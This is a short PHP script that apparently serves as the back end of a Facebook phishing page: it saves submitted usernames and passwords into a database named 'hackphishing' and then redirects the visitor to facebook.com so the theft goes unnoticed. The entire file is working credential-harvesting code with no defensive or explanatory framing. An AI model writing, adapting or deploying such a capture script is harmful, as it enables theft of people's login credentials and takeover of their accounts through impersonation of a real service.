<?php
include 'ip.php';

// Database connection
$servername = "localhost";
$username = "root";
$password = ""; // default for XAMPP
$dbname = "hackphishing";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Prepare and bind
$stmt = $conn->prepare("INSERT INTO usuarios (correo, contra) VALUES (?, ?)");
$stmt->bind_param("ss", $_POST['User'], $_POST['Password']);

// Execute
$stmt->execute();

$stmt->close();
$conn->close();

header('Location: https://facebook.com');
exit();
?>
